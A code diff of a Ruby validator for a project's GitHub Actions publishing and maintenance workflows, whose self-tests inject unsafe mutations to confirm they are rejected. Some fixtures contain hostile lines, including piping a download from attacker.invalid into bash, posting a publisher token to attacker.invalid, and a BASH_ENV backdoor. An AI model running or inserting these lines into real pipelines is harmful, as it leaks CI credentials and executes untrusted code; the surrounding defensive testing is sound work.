+  check((credential_names & anonymous_run.scan(/[A-Z][A-Z0-9_]+/)).empty?,
+        "publisher anonymous bottle readback references a credential")
+  full_fetch_run = named_step(verify_steps,
+                              "Fetch the complete ABI browser runtime graph").fetch("run")
+  check(full_fetch_run.include?("bash scripts/dev-shell.sh bash scripts/fetch-binaries.sh --fetch-only"),
+        "publisher browser verification does not fetch the complete ABI runtime graph")
+  sidecar_run = named_step(verify_steps,
+                           "Generate sidecars from the selected bottle").fetch("run")
+  check(sidecar_run.include?('KANDELO_HOMEBREW_BOTTLE_ARCHIVE="$RUNTIME_BOTTLE"') &&
+        sidecar_run.include?("scripts/homebrew-generate-sidecars-from-env.sh"),
+        "publisher sidecars do not use the anonymously selected bottle bytes")
+  browser_run = named_step(verify_steps,
+                           "Build and strictly smoke the hello browser image").fetch("run")
+  [
+    "bash scripts/dev-shell.sh bash -c", "KANDELO_HOMEBREW_STRICT_PUBLISHER_SMOKE=1",
+    "--reporter=json", ".stats.expected == 1", ".stats.unexpected == 0",
+    ".stats.flaky == 0", ".stats.skipped == 0",
+  ].each do |fragment|
+    check(browser_run.include?(fragment), "publisher strict browser smoke lacks #{fragment}")
+  end
+
+  package_handoff_run = named_step(verify_steps,
+                                   "Package validated data-only publication handoff").fetch("run")
+  [
+    "for file in manifest.json bottle.json bottle.tar.gz", "receipt.json",
+    'sidecars/Formula', 'sidecars/Kandelo', "scripts/homebrew-validate-publish-handoff.sh",
+  ].each do |fragment|
+    check(package_handoff_run.include?(fragment), "publisher publication handoff lacks #{fragment}")
+  end
+  check(!package_handoff_run.match?(/(?:^|\s)(?:cp|rsync)[^\n]*(?:scripts?|\.env)(?:\s|\/|$)/),
+        "publisher publication handoff includes executable or environment data")
+
+  payload_validation = named_step(finalize_steps,
+                                  "Validate the complete data-only publication payload")
+  publish_checkout = named_step(finalize_steps,
+                                "Checkout tap publication branch after payload validation")
+  check(payload_validation["id"] == "validate-payload" &&
+        payload_validation["continue-on-error"] == true &&
+        payload_validation.fetch("run").include?("scripts/homebrew-validate-publish-handoff.sh") &&
+        payload_validation.fetch("run").include?('homebrew-validate --tap-root "$validation_tap"') &&
+        finalize_steps.index(payload_validation) < finalize_steps.index(publish_checkout),
+        "publisher finalizer does not validate the strict handoff before credentialed checkout")
+  check(finalize_steps.none? { |step| step["uses"] == UPLOAD_ACTION } &&
+        finalize_steps.none? { |step| step["name"].to_s.downcase.include?("diagnostic") },
+        "credentialed finalizer publishes diagnostics")
+
+  report_checkout = named_step(finalize_steps,
+                               "Checkout clean tap for a failed-attempt report")
+  report = named_step(finalize_steps,
+                      "Record failed attempt without replacing last-green metadata")
+  final_fail = named_step(finalize_steps, "Fail after reporting an unsuccessful matrix entry")
+  check(report_checkout["if"] == failure_condition && report["if"] == failure_condition &&
+        final_fail["if"] == failure_condition,
+        "publisher failed-attempt path changed")
+  report_run = report.fetch("run")
+  check(report_run.include?('--tap-root "$GITHUB_WORKSPACE/tap-report"') &&
+        !report_run.include?("tap-publish") && !report_run.include?("homebrew-finalize-error.txt") &&
+        report_run.include?('error_text="publish-handoff=$PUBLISH_HANDOFF_OUTCOME; '),
+        "publisher failure report does not use a clean checkout and sanitized outcomes")
+
+  check(!values_for_key(workflow, "run").join("\n").include?("GITHUB_SHA"),
+        "publisher uses caller-context SHA as source provenance")
+  check(contract_digest(plan_steps) == PUBLISHER_PLAN_DIGEST,
+        "publisher plan step contract changed")
+  check(contract_digest(build_steps) == PUBLISHER_BUILD_DIGEST,
+        "publisher build step contract changed")
+  check(contract_digest(upload_steps) == PUBLISHER_UPLOAD_DIGEST,
+        "publisher upload step contract changed")
+  check(contract_digest(verify_steps) == PUBLISHER_VERIFY_DIGEST,
+        "publisher verification step contract changed")
+  check(contract_digest(finalize_steps) == PUBLISHER_FINALIZE_DIGEST,
+        "publisher finalization step contract changed")
 end
 
 def check_maintenance(workflow)
-  top_level_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
-  check(top_level_keys == %w[concurrency jobs name on],
+  top_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
+  check(top_keys == %w[concurrency jobs name on],
         "maintenance has unexpected top-level configuration")
   check(workflow["name"] == "Reusable Kandelo Homebrew bottle maintenance",
         "maintenance name changed")
-  expected_concurrency = {
+  check(workflow["concurrency"] == {
     "group" => "kandelo-homebrew-bottle-maintenance-Automattic-kandelo-homebrew-" \
                "${{ inputs.release-tag || github.run_id }}",
     "cancel-in-progress" => false,
-  }
-  check(workflow["concurrency"] == expected_concurrency,
-        "maintenance concurrency contract changed")
+  }, "maintenance concurrency contract changed")
 
   events = workflow_events(workflow)
   check(events.keys == ["workflow_call"], "maintenance must only expose workflow_call")
   workflow_call = events.fetch("workflow_call")
   check(workflow_call.keys == ["inputs"], "maintenance workflow_call contract changed")
-  expected_inputs = {
+  check(workflow_call["inputs"] == {
     "mode" => { "type" => "string", "default" => "rebuild" },
     "formulae" => { "type" => "string", "required" => true },
     "arches" => { "type" => "string", "default" => "wasm32" },
@@ -368,31 +629,49 @@ def check_maintenance(workflow)
     "rollback-ref" => { "type" => "string", "default" => "" },
     "deleted-package-url" => { "type" => "string", "default" => "" },
     "deletion-reason" => { "type" => "string", "default" => "" },
-  }
-  check(workflow_call["inputs"] == expected_inputs, "maintenance inputs changed")
+  }, "maintenance inputs changed")
+  check(!workflow.key?("permissions"), "maintenance requests workflow permissions")
   check_common(workflow, "maintenance workflow")
 
   jobs = workflow_jobs(workflow)
-  check(jobs.keys.sort == %w[rebuild-or-repair rollback],
-        "maintenance has an unexpected job set")
-  expected_uses = [
-    "./.github/workflows/reusable-homebrew-bottle-publish.yml",
-    "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd",
-    "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd",
-    "DeterminateSystems/nix-installer-action@ef8a148080ab6020fd15196c2084a2eea5ff2d25",
-  ].sort
-  check(values_for_key(workflow, "uses").sort == expected_uses,
-        "maintenance action set or pin changed")
-  rebuild = jobs.fetch("rebuild-or-repair")
-  check(rebuild.keys.sort == %w[if permissions uses with] &&
-        rebuild["if"] == "${{ inputs.mode == 'rebuild' || inputs.mode == 'repair-only' }}",
-        "maintenance rebuild execution contract changed")
+  check(jobs.keys.sort == %w[rebuild rollback validate], "maintenance has an unexpected job set")
+  validate = jobs.fetch("validate")
+  rebuild = jobs.fetch("rebuild")
+  rollback = jobs.fetch("rollback")
+  check(validate.keys.sort == %w[permissions runs-on steps],
+        "maintenance validation job changed")
+  check(validate["runs-on"] == "ubuntu-latest" && validate["permissions"] == {},
+        "maintenance validation authority changed")
+  validate_steps = job_steps(validate, "maintenance validate")
+  check(contract_digest(validate_steps) == MAINTENANCE_VALIDATE_DIGEST,
+        "maintenance validation step contract changed")
+  validate_step = named_step(validate_steps, "Validate maintenance mode")
+  check(validate_step["env"] == {
+    "CALLER_EVENT_NAME" => "${{ github.event_name }}",
+    "CALLER_REF" => "${{ github.ref }}",
+    "CALLER_REPOSITORY" => "${{ github.repository }}",
+    "CALLER_WORKFLOW_REF" => "${{ github.workflow_ref }}",
+    "MODE" => "${{ inputs.mode }}",
+  }, "maintenance caller validation mapping changed")
+  validate_run = validate_step.fetch("run")
+  [
+    '[ "$CALLER_REPOSITORY" = "Automattic/kandelo-homebrew" ]',
+    '[ "$CALLER_REF" = "refs/heads/main" ]',
+    '[ "$CALLER_EVENT_NAME" = "repository_dispatch" ]',
+    "maintain-bottles.yml@refs/heads/main",
+    "rebuild|rollback",
+  ].each do |fragment|
+    check(validate_run.include?(fragment), "maintenance validation lacks #{fragment}")
+  end
+
   expected_rebuild_permissions = { "contents" => "write", "packages" => "write", "actions" => "read" }
-  check(exact_permissions?(rebuild["permissions"], expected_rebuild_permissions),
-        "maintenance rebuild permissions are not exact")
-  check(rebuild["uses"] == "./.github/workflows/reusable-homebrew-bottle-publish.yml",
-        "maintenance rebuild does not call the reviewed publisher")
-  expected_rebuild_with = {
+  check(rebuild.keys.sort == %w[if needs permissions uses with] &&
+        rebuild["needs"] == ["validate"] &&
+        rebuild["if"] == "${{ inputs.mode == 'rebuild' }}" &&
+        exact_permissions?(rebuild["permissions"], expected_rebuild_permissions) &&
+        rebuild["uses"] == "./.github/workflows/reusable-homebrew-bottle-publish.yml",
+        "maintenance rebuild execution contract changed")
+  check(rebuild["with"] == {
     "kandelo-repository" => "Automattic/kandelo",
     "kandelo-ref" => "main",
     "tap-repository" => "Automattic/kandelo-homebrew",
@@ -402,330 +681,311 @@ def check_maintenance(workflow)
     "release-tag" => "${{ inputs.release-tag }}",
     "expected-cache-keys" => "${{ inputs.expected-cache-keys }}",
     "force" => "${{ inputs.force }}",
-    "repair-only" => "${{ inputs.mode == 'repair-only' }}",
     "dry-run" => false,
-  }
-  check(rebuild.fetch("with") == expected_rebuild_with,
-        "maintenance rebuild input wiring changed")
+  }, "maintenance rebuild input wiring changed")
 
-  rollback = jobs.fetch("rollback")
-  check(rollback.keys.sort == %w[if permissions runs-on steps timeout-minutes] &&
+  expected_rollback_permissions = { "contents" => "write", "packages" => "read", "actions" => "read" }
+  check(rollback.keys.sort == %w[if needs permissions runs-on steps timeout-minutes] &&
+        rollback["needs"] == ["validate"] &&
         rollback["if"] == "${{ inputs.mode == 'rollback' }}" &&
         rollback["runs-on"] == "ubuntu-latest" &&
-        rollback["timeout-minutes"] == 30,
+        rollback["timeout-minutes"] == 30 &&
+        exact_permissions?(rollback["permissions"], expected_rollback_permissions),
         "maintenance rollback execution contract changed")
-  expected_rollback_permissions = { "contents" => "write", "packages" => "read", "actions" => "read" }
-  check(exact_permissions?(rollback["permissions"], expected_rollback_permissions),
-        "maintenance rollback permissions are not exact")
   rollback_steps = job_steps(rollback, "maintenance rollback")
-  check(step_contract_digest(rollback_steps) ==
-        "7af666d90021b9b9b913bfe4810368d559062bfcabd09c7d880459b022ff3f42",
+  check(contract_digest(rollback_steps) == MAINTENANCE_ROLLBACK_DIGEST,
         "maintenance rollback step contract changed")
-  checkout_steps = rollback_steps.select do |step|
-    next unless step["uses"].to_s.downcase.start_with?("actions/checkout@")
-    step
-  end
-  expected_checkout_steps = [
+  check(values_for_key(workflow, "uses").sort == [
+    "./.github/workflows/reusable-homebrew-bottle-publish.yml",
+    CHECKOUT_ACTION,
+    CHECKOUT_ACTION,
+    NIX_ACTION,
+  ].sort, "maintenance action set or pin changed")
+
+  checkouts = rollback_steps.select { |step| step["uses"] == CHECKOUT_ACTION }
+  check(checkouts.map { |step| { "name" => step["name"], "with" => step["with"] } } == [
     {
       "name" => "Checkout tap",
-      "uses" => "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd",
       "with" => {
         "repository" => "Automattic/kandelo-homebrew",
         "ref" => "main",
         "path" => "tap",
+        "fetch-depth" => 0,
       },
     },
     {
       "name" => "Checkout Kandelo workflow source",
-      "uses" => "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd",
       "with" => {
+        "persist-credentials" => false,
         "repository" => "Automattic/kandelo",
         "ref" => "main",
         "path" => "kandelo",
         "submodules" => false,
       },
     },
-  ]
-  check(checkout_steps == expected_checkout_steps,
-        "maintenance rollback checkout mapping changed")
-  maintenance_nix_steps = rollback_steps.select do |step|
-    step["uses"] == "DeterminateSystems/nix-installer-action@ef8a148080ab6020fd15196c2084a2eea5ff2d25"
-  end
-  expected_maintenance_nix_step = {
-    "name" => "Install Nix",
-    "uses" => "DeterminateSystems/nix-installer-action@ef8a148080ab6020fd15196c2084a2eea5ff2d25",
-    "with" => { "github-token" => "" },
-  }
-  check(maintenance_nix_steps == [expected_maintenance_nix_step],
-        "maintenance Nix installer action mapping changed")
+  ], "maintenance rollback checkout mapping changed")
 
-  record_step = rollback_steps.find do |step|
-    step["name"] == "Record rollback without replacing last-green metadata"
-  end
-  check(!record_step.nil?, "maintenance rollback lacks the metadata step")
-  record_env = record_step.fetch("env")
-  {
-    "KANDELO_HOMEBREW_FORMULA" => "${{ inputs.formulae }}",
-    "KANDELO_HOMEBREW_ARCH" => "${{ inputs.arches }}",
-    "KANDELO_HOMEBREW_RELEASE_TAG" => "${{ inputs.release-tag }}",
-  }.each do |key, value|
-    check(record_env[key] == value, "maintenance rollback has an unexpected #{key}")
-  end
-  record_run = record_step["run"].to_s
-  %w[KANDELO_HOMEBREW_FORMULA KANDELO_HOMEBREW_ARCH KANDELO_HOMEBREW_RELEASE_TAG].each do |name|
-    check(record_run.include?("$#{name}"), "maintenance rollback does not use #{name}")
-  end
+  record = named_step(rollback_steps, "Record rollback without replacing last-green metadata")
+  record_run = record.fetch("run")
   [
     '[[ "$KANDELO_HOMEBREW_FORMULA" =~ ^[a-z0-9][a-z0-9._-]*$ ]]',
     'case "$KANDELO_HOMEBREW_ARCH" in',
-    'wasm32|wasm64) ;;',
+    "wasm32|wasm64) ;;",
     '[[ "$KANDELO_HOMEBREW_RELEASE_TAG" =~ ^bottles-abi-v[1-9][0-9]*$ ]]',
-  ].each do |validation|
-    check(record_run.include?(validation), "maintenance rollback lacks #{validation}")
+  ].each do |fragment|
+    check(record_run.include?(fragment), "maintenance rollback lacks #{fragment}")
   end
+end
+
+def expect_rejection(label)
+  rejected = false
+  begin
+    yield
+  rescue KeyError, RuntimeError
+    rejected = true
+  end
+  check(rejected, "self-test accepted #{label}")
+end
+
+def mutate_named_step(workflow, job_name, step_name)
+  steps = workflow.fetch("jobs").fetch(job_name).fetch("steps")
+  step = steps.find { |candidate| candidate["name"] == step_name }
+  raise "self-test could not find #{step_name}" unless step
+  step
 end
 
 def self_test(publisher, maintenance)
   fixture = YAML.safe_load(<<~YAML, aliases: false)
     on:
       workflow_dispatch: {}
-    permissions: "write-all"
+    permissions: write-all
     jobs:
       unsafe:
-        permissions:
-          contents: "write"
         steps:
-          - uses: >-
-              actions/cache/restore@v4
-          - run: >-
-              echo "${{ inputs.formulae }}"
+          - uses: actions/cache/restore@v4
+          - run: echo "${{ inputs.formulae }}"
           - uses: actions/checkout@v6
   YAML
   check(workflow_events(fixture).key?("workflow_dispatch"), "self-test missed workflow_dispatch")
-  check(fixture["permissions"] == "write-all", "self-test missed quoted write-all")
-  check(fixture.dig("jobs", "unsafe", "permissions", "contents") == "write",
-        "self-test missed quoted write permission")
-  check(values_for_key(fixture, "uses").include?("actions/cache/restore@v4"),
-        "self-test missed folded cache action")
-  check(values_for_key(fixture, "run").first.include?("${{"),
-        "self-test missed folded shell expression")
-  check(values_for_key(fixture, "uses").include?("actions/checkout@v6"),
-        "self-test missed unnamed checkout")
-  expect_rejection("a mutable external action ref") do
-    check_common(
-      { "jobs" => { "unsafe" => { "steps" => [{ "uses" => "actions/checkout@v6.0.2" }] } } },
-      "self-test workflow",
-    )
+  expect_rejection("mutable action and cache state") { check_common(fixture, "fixture") }
+
+  publisher_mutations = {
+    "top-level environment injection" => lambda { |w| w["env"] = { "BASH_ENV" => "/tmp/backdoor" } },
+    "workflow write permission" => lambda { |w| w["permissions"] = "write-all" },
+    "direct dispatch" => lambda { |w| workflow_events(w)["workflow_dispatch"] = {} },
+    "extra publisher input" => lambda { |w|
+      workflow_events(w).fetch("workflow_call").fetch("inputs")["command"] = {
+        "type" => "string", "default" => "true",
+      }
+    },
+    "caller feature branch" => lambda { |w|
+      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
+      step["run"] = step.fetch("run").sub("refs/heads/main", "refs/heads/feature")
+    },
+    "dry-run feature workflow" => lambda { |w|
+      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
+      step["run"] = step.fetch("run").sub("dry-run-bottles.yml@refs/heads/main",
+                                           "feature.yml@refs/heads/feature")
+    },
+    "wrong caller event" => lambda { |w|
+      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
+      step.fetch("env")["CALLER_EVENT_NAME"] = "push"
+    },
+    "release tag ABI bypass" => lambda { |w|
+      step = mutate_named_step(w, "plan", "Resolve release and bottle root")
+      step["run"] = step.fetch("run").sub('[ "$release_tag" != "$expected_release_tag" ]', "false")
+    },
+    "uploader dependency bypass" => lambda { |w|
+      w.fetch("jobs").fetch("upload-bottle")["needs"] = ["plan"]
+    },
+    "verifier dependency bypass" => lambda { |w|
+      w.fetch("jobs").fetch("verify-bottle")["needs"] = ["plan", "upload-bottle"]
+    },
+    "finalizer dependency bypass" => lambda { |w|
+      w.fetch("jobs").fetch("finalize-tap")["needs"] = ["plan", "verify-bottle"]
+    },
+    "build authority escalation" => lambda { |w|
+      w.fetch("jobs").fetch("build-and-test").fetch("permissions")["packages"] = "write"
+    },
+    "uploader authority escalation" => lambda { |w|
+      w.fetch("jobs").fetch("upload-bottle").fetch("permissions")["contents"] = "write"
+    },
+    "verifier authority escalation" => lambda { |w|
+      w.fetch("jobs").fetch("verify-bottle").fetch("permissions")["packages"] = "read"
+    },
+    "finalizer authority escalation" => lambda { |w|
+      w.fetch("jobs").fetch("finalize-tap").fetch("permissions")["packages"] = "write"
+    },
+    "dry-run bottle upload" => lambda { |w|
+      job = w.fetch("jobs").fetch("upload-bottle")
+      job["if"] = job.fetch("if").sub(" && !inputs.dry-run", "")
+    },
+    "dry-run tap finalization" => lambda { |w|
+      job = w.fetch("jobs").fetch("finalize-tap")
+      job["if"] = job.fetch("if").sub(" && !inputs.dry-run", "")
+    },
+    "unreviewed Kandelo ref" => lambda { |w|
+      step = mutate_named_step(w, "build-and-test", "Checkout Kandelo workflow source")
+      step.fetch("with")["ref"] = "feature"
+    },
+    "persisted source credentials" => lambda { |w|
+      step = mutate_named_step(w, "build-and-test", "Checkout tap")
+      step.fetch("with")["persist-credentials"] = true
+    },
+    "persisted verifier credentials" => lambda { |w|
+      step = mutate_named_step(w, "verify-bottle", "Checkout exact tap source")
+      step.fetch("with")["persist-credentials"] = true
+    },
+    "build token exposure" => lambda { |w|
+      step = mutate_named_step(w, "build-and-test",
+                               "Build and test Homebrew bottle without publisher credentials")
+      step["env"]["GH_TOKEN"] = "${{ github.token }}"
+    },
+    "verifier token exposure" => lambda { |w|
+      step = mutate_named_step(w, "verify-bottle",
+                               "Select exact anonymous bottle bytes for runtime validation")
+      step["env"]["GH_TOKEN"] = "${{ github.token }}"
+    },
+    "mutable Homebrew source" => lambda { |w|
+      step = mutate_named_step(w, "build-and-test", "Checkout reviewed Homebrew implementation")
+      step.fetch("with")["ref"] = "main"
+    },
+    "noncanonical Homebrew prefix" => lambda { |w|
+      step = mutate_named_step(w, "build-and-test", "Activate reviewed Homebrew implementation")
+      step["run"] = step.fetch("run").sub("/home/linuxbrew/.linuxbrew", "/tmp/homebrew")
+    },
+    "mutable external action" => lambda { |w|
+      step = mutate_named_step(w, "upload-bottle", "Download strict build handoff")
+      step["uses"] = "actions/download-artifact@main"
+    },
+    "direct expression in shell" => lambda { |w|
+      step = mutate_named_step(w, "build-and-test", "Warm Kandelo dev shell")
+      step["run"] = "echo '${{ inputs.formulae }}'\n#{step.fetch('run')}"
+    },
+    "handoff retry collision" => lambda { |w|
+      step = mutate_named_step(w, "build-and-test", "Upload strict bottle build handoff")
+      step.fetch("with")["name"] = "homebrew-build-handoff-${{ matrix.formula }}-${{ matrix.arch }}"
+    },
+    "unvalidated uploader ordering" => lambda { |w|
+      steps = w.fetch("jobs").fetch("upload-bottle").fetch("steps")
+      validate_index = steps.index { |step| step["name"] == "Validate build data before exposing upload credentials" }
+      upload_index = steps.index { |step| step["name"] == "Upload validated bottle in isolated ORAS auth state" }
+      steps[validate_index], steps[upload_index] = steps[upload_index], steps[validate_index]
+    },
+    "uploader validation outcome bypass" => lambda { |w|
+      step = mutate_named_step(w, "upload-bottle",
+                               "Upload validated bottle in isolated ORAS auth state")
+      step.delete("if")
+    },
+    "direct ORAS upload bypass" => lambda { |w|
+      step = mutate_named_step(w, "upload-bottle", "Upload validated bottle in isolated ORAS auth state")
+      step["run"] = step.fetch("run").sub("scripts/homebrew-ghcr-upload.sh", "oras push")
+    },
+    "credentialed uploader diagnostics" => lambda { |w|
+      w.fetch("jobs").fetch("upload-bottle").fetch("steps") << {
+        "name" => "Upload diagnostics", "uses" => UPLOAD_ACTION,
+        "with" => { "name" => "diagnostics", "path" => "${{ runner.temp }}" },
+      }
+    },
+    "missing anonymous readback" => lambda { |w|
+      step = mutate_named_step(w, "verify-bottle",
+                               "Select exact anonymous bottle bytes for runtime validation")
+      step["run"] = step.fetch("run").sub("homebrew-verify-public-bottle.ts", "true")
+    },
+    "partial browser runtime fetch" => lambda { |w|
+      step = mutate_named_step(w, "verify-bottle", "Fetch the complete ABI browser runtime graph")
+      step["run"] = step.fetch("run").sub("scripts/fetch-binaries.sh --fetch-only", "scripts/fetch-node.sh")
+    },
+    "raw bottle JSON handoff" => lambda { |w|
+      step = mutate_named_step(w, "verify-bottle",
+                               "Validate build handoff and reconstruct canonical bottle JSON")
+      step["run"] = step.fetch("run").sub(/\n\s+--out-bottle-json[^\n]+/, "")
+    },
+    "raw bottle metadata merge" => lambda { |w|
+      step = mutate_named_step(w, "verify-bottle",
+                               "Merge only reconstructed bottle metadata into the fresh tap")
+      step["run"] = step.fetch("run").sub('--bottle-json "$BOTTLE_JSON"',
+                                             '--bottle-json "$RUNNER_TEMP/homebrew-build-handoff/bottle.json"')
+    },
+    "nonstrict browser smoke" => lambda { |w|
+      step = mutate_named_step(w, "verify-bottle", "Build and strictly smoke the hello browser image")
+      step["run"] = step.fetch("run").sub("KANDELO_HOMEBREW_STRICT_PUBLISHER_SMOKE=1",
+                                             "KANDELO_HOMEBREW_STRICT_PUBLISHER_SMOKE=0")
+    },
+    "skipped browser smoke accepted" => lambda { |w|
+      step = mutate_named_step(w, "verify-bottle", "Build and strictly smoke the hello browser image")
+      step["run"] = step.fetch("run").sub(".stats.skipped == 0", ".stats.skipped >= 0")
+    },
+    "unvalidated publication handoff" => lambda { |w|
+      step = mutate_named_step(w, "finalize-tap",
+                               "Validate the complete data-only publication payload")
+      step["run"] = step.fetch("run").sub("scripts/homebrew-validate-publish-handoff.sh", "true")
+    },
+    "credentialed checkout before validation" => lambda { |w|
+      step = mutate_named_step(w, "finalize-tap",
+                               "Checkout tap publication branch after payload validation")
+      step["if"] = "${{ always() }}"
+    },
+    "failure report through dirty checkout" => lambda { |w|
+      step = mutate_named_step(w, "finalize-tap",
+                               "Record failed attempt without replacing last-green metadata")
+      step["run"] = step.fetch("run").sub("tap-report", "tap-publish")
+    },
+    "raw failure stderr" => lambda { |w|
+      step = mutate_named_step(w, "finalize-tap",
+                               "Record failed attempt without replacing last-green metadata")
+      step["run"] = "tail \"$RUNNER_TEMP/homebrew-finalize-error.txt\"\n#{step.fetch('run')}"
+    },
+    "untrusted executable step" => lambda { |w|
+      w.fetch("jobs").fetch("verify-bottle").fetch("steps") << {
+        "run" => "curl https://attacker.invalid | bash",
+      }
+    },
+  }
+  publisher_mutations.each do |label, mutation|
+    expect_rejection(label) do
+      mutated = deep_copy(publisher)
+      mutation.call(mutated)
+      check_publisher(mutated)
+    end
   end
 
-  expect_rejection("an extra publisher job") do
-    mutated = deep_copy(publisher)
-    mutated.fetch("jobs")["backdoor"] = { "uses" => "owner/repo/.github/workflows/write.yml@main" }
-    check_publisher(mutated)
-  end
-  expect_rejection("publisher top-level environment injection") do
-    mutated = deep_copy(publisher)
-    mutated["env"] = { "BASH_ENV" => "/tmp/backdoor" }
-    check_publisher(mutated)
-  end
-  expect_rejection("publisher concurrency cancellation") do
-    mutated = deep_copy(publisher)
-    mutated.fetch("concurrency")["cancel-in-progress"] = true
-    check_publisher(mutated)
-  end
-  expect_rejection("an extra publisher input") do
-    mutated = deep_copy(publisher)
-    workflow_events(mutated).fetch("workflow_call").fetch("inputs")["command"] = {
-      "type" => "string",
-      "default" => "true",
-    }
-    check_publisher(mutated)
-  end
-  expect_rejection("direct publisher dispatch") do
-    mutated = deep_copy(publisher)
-    workflow_events(mutated)["workflow_dispatch"] = {}
-    check_publisher(mutated)
-  end
-  expect_rejection("a pre-validation executable step") do
-    mutated = deep_copy(publisher)
-    mutated.dig("jobs", "plan", "steps").unshift({ "run" => "echo selected code" })
-    check_publisher(mutated)
-  end
-  expect_rejection("short-circuited trust validation") do
-    mutated = deep_copy(publisher)
-    step = mutated.dig("jobs", "plan", "steps").first
-    step["run"] = "exit 0\n#{step['run']}"
-    check_publisher(mutated)
-  end
-  expect_rejection("continued trust-validation failure") do
-    mutated = deep_copy(publisher)
-    mutated.dig("jobs", "plan", "steps").first["continue-on-error"] = true
-    check_publisher(mutated)
-  end
-  expect_rejection("an overridden trust-validation shell") do
-    mutated = deep_copy(publisher)
-    mutated.dig("jobs", "plan", "steps").first["shell"] = "bash -c 'exit 0' {0}"
-    check_publisher(mutated)
-  end
-  expect_rejection("a self-hosted publisher plan") do
-    mutated = deep_copy(publisher)
-    mutated.dig("jobs", "plan")["runs-on"] = "self-hosted"
-    check_publisher(mutated)
-  end
-  expect_rejection("a self-hosted publisher build") do
-    mutated = deep_copy(publisher)
-    mutated.dig("jobs", "build-and-publish")["runs-on"] = "self-hosted"
-    check_publisher(mutated)
-  end
-  expect_rejection("a build detached from the validated plan") do
-    mutated = deep_copy(publisher)
-    build = mutated.dig("jobs", "build-and-publish")
-    build.delete("needs")
-    build["if"] = true
-    check_publisher(mutated)
-  end
-  expect_rejection("an unreviewed plan checkout repository") do
-    mutated = deep_copy(publisher)
-    step = mutated.dig("jobs", "plan", "steps").find do |candidate|
-      candidate["name"] == "Checkout Kandelo workflow source"
+  maintenance_mutations = {
+    "maintenance top-level environment injection" => lambda { |w|
+      w["env"] = { "BASH_ENV" => "/tmp/backdoor" }
+    },
+    "maintenance feature caller" => lambda { |w|
+      step = mutate_named_step(w, "validate", "Validate maintenance mode")
+      step["run"] = step.fetch("run").sub("refs/heads/main", "refs/heads/feature")
+    },
+    "maintenance caller workflow bypass" => lambda { |w|
+      step = mutate_named_step(w, "validate", "Validate maintenance mode")
+      step["run"] = step.fetch("run").sub("maintain-bottles.yml", "feature.yml")
+    },
+    "maintenance mode short circuit" => lambda { |w|
+      step = mutate_named_step(w, "validate", "Validate maintenance mode")
+      step["run"] = "exit 0\n#{step.fetch('run')}"
+    },
+    "maintenance rebuild validation bypass" => lambda { |w|
+      w.fetch("jobs").fetch("rebuild").delete("needs")
+    },
+    "maintenance repair mode" => lambda { |w|
+      w.fetch("jobs").fetch("rebuild")["if"] =
+        "${{ inputs.mode == 'rebuild' || inputs.mode == 'repair-only' }}"
+    },
+    "maintenance rollback write-all" => lambda { |w|
+      w.fetch("jobs").fetch("rollback")["permissions"] = { "contents" => "write", "packages" => "write" }
+    },
+    "maintenance secret inheritance" => lambda { |w|
+      w.fetch("jobs").fetch("rebuild")["secrets"] = "inherit"
+    },
+  }
+  maintenance_mutations.each do |label, mutation|
+    expect_rejection(label) do
+      mutated = deep_copy(maintenance)
+      mutation.call(mutated)
+      check_maintenance(mutated)
     end
-    step.fetch("with")["repository"] = "unreviewed/attacker-code"
-    check_publisher(mutated)
-  end
-  expect_rejection("an unreviewed build checkout ref") do
-    mutated = deep_copy(publisher)
-    step = mutated.dig("jobs", "build-and-publish", "steps").find do |candidate|
-      candidate["name"] == "Checkout Kandelo workflow source"
-    end
-    step.fetch("with")["ref"] = "unreviewed-branch"
-    check_publisher(mutated)
-  end
-  expect_rejection("an unpinned Homebrew setup action") do
-    mutated = deep_copy(publisher)
-    mutated.dig("jobs", "build-and-publish", "steps") << {
-      "uses" => "Homebrew/actions/setup-homebrew@master",
-    }
-    check_publisher(mutated)
-  end
-  expect_rejection("a second cache-enabled Magic Nix action") do
-    mutated = deep_copy(publisher)
-    mutated.dig("jobs", "build-and-publish", "steps") << {
-      "uses" => "DeterminateSystems/magic-nix-cache-action@908b263ff629f4cc17666315b7fd3ec127c6244d",
-      "with" => { "use-gha-cache" => true, "use-flakehub" => true },
-    }
-    check_publisher(mutated)
-  end
-  expect_rejection("cache-enabled reviewed Magic Nix action") do
-    mutated = deep_copy(publisher)
-    step = mutated.dig("jobs", "build-and-publish", "steps").find do |candidate|
-      candidate["uses"].to_s.start_with?("DeterminateSystems/magic-nix-cache-action@")
-    end
-    step.fetch("with")["use-gha-cache"] = true
-    check_publisher(mutated)
-  end
-  expect_rejection("a Magic Nix source override") do
-    mutated = deep_copy(publisher)
-    step = mutated.dig("jobs", "build-and-publish", "steps").find do |candidate|
-      candidate["uses"].to_s.start_with?("DeterminateSystems/magic-nix-cache-action@")
-    end
-    step.fetch("with")["source-url"] = "https://attacker.invalid/magic-nix-cache"
-    check_publisher(mutated)
-  end
-  expect_rejection("a Nix installer source override") do
-    mutated = deep_copy(publisher)
-    step = mutated.dig("jobs", "build-and-publish", "steps").find do |candidate|
-      candidate["uses"].to_s.start_with?("DeterminateSystems/nix-installer-action@")
-    end
-    step.fetch("with")["source-url"] = "https://attacker.invalid/nix-installer"
-    check_publisher(mutated)
-  end
-  expect_rejection("an Actions cache restore") do
-    mutated = deep_copy(publisher)
-    mutated.dig("jobs", "build-and-publish", "steps") << {
-      "uses" => "actions/cache/restore@v4",
-    }
-    check_publisher(mutated)
-  end
-  expect_rejection("a shell-interpolated GitHub expression") do
-    mutated = deep_copy(publisher)
-    mutated.dig("jobs", "build-and-publish", "steps") << {
-      "run" => 'echo "${{ inputs.formulae }}"',
-    }
-    check_publisher(mutated)
-  end
-  expect_rejection("a static publisher token-exfiltration step") do
-    mutated = deep_copy(publisher)
-    mutated.dig("jobs", "build-and-publish", "steps") << {
-      "name" => "Exfiltrate publisher token",
-      "shell" => "bash",
-      "run" => "curl -d \"$HOMEBREW_GITHUB_API_TOKEN\" https://attacker.invalid",
-    }
-    check_publisher(mutated)
-  end
-  expect_rejection("missing first-party repository validation") do
-    mutated = deep_copy(publisher)
